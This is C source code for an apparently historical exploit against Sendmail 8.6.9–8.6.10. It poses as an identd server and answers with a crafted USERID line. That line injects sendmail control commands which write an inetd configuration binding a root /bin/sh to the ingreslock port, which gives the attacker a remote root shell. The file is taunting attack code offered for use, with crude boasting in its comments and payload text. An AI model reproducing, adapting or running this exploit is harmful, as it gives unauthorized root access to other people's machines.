/* Sendmail 8.6.9 identd hack.  -- SnoCrash [r00t] */
/* 9/29/95 -- Fixed to make it compile on fuxin' SunOS */
/* Fixed some more so it can work on 8.6.10 -- 10/2/95 */
/* Final cleanup -- 10/4/95.                     [2000]*/

#include <stdio.h>
#include <sys/types.h>
#include <sys/fcntl.h>
#include <gnu/types.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#define OUTPUT_BUFFER 4096   /* Output and input, */
#define SOCKET_BUFFER 512    /* with which we must up-put */
void main(void)
{
  struct fd_set fdesc;   /* File descriptor structure */
  char outbuf[OUTPUT_BUFFER];  /* Our output buffer */
  char inbuf[SOCKET_BUFFER];   /* ""  input "" */
  /* Preparing to read incoming data, captain. */
  FD_ZERO(&fdesc);
  FD_SET(0, &fdesc);

  /* Read it, Sulu! Now! */
  if(read(0, inbuf, SOCKET_BUFFER - 1)<=0)
    exit(1);
  FD_SET(0, &fdesc);

  /* Now we send our instructions, under the guise of innocent
   * ol' identd.  I find this ironic, that identd, supposedly
   * a standard that would help stop "evil hacker types", became
   * part of one of the bigger holes to ever hit the net.  Hmm.
   * Ain't life funny that way sometimes? :)
   */
  sprintf(outbuf, " \
          %s : USERID : UNIX : Evil_Hacker_Type...Phear_Me.  So, like.. here are \
          my evil commands for you to execute so I can rox yer box.  Check this out... \
          \r\nCroot\r\nR<\"|/bin/echo ingreslock stream tcp nowait root /bin/sh /bin/sh > \
          /tmp/.inetd.conf ; /usr/sbin/inetd /tmp/.inetd.conf \">\r\nHReceived: Pretty \
          fucking eleet, eh?  Now I just have to sit here and babble so I can fill \
          up your crappy buffer.  So I bet youre wondering how this got here.  Well \
          lets just say you shouldnt run a Sendmail earlier or later than 8.6.11. \
          8.6.12 has a whole load of different bugs, but this isnt one of them. \
          Im not so sure about 8.7.x, but I wouldnt trust Eric Allman too much. \
          weellll... it's been fun fucking with your box and all, but I really must \
          be going, so I guess Ill see you around.  Tell all your friends to be nice \
          and leave the door open like you did.  Thanks... its been real.   \unkyfunkyfunkyfunkyfunkyfunkyfunkyfunkyfunkyfunkyfunky....aaah this is just too
          funky.\r\n \
          ", inbuf);

  write(1, outbuf, strlen(outbuf));
  exit(0);
}
/*                    www.hack.co.za              [2000]*/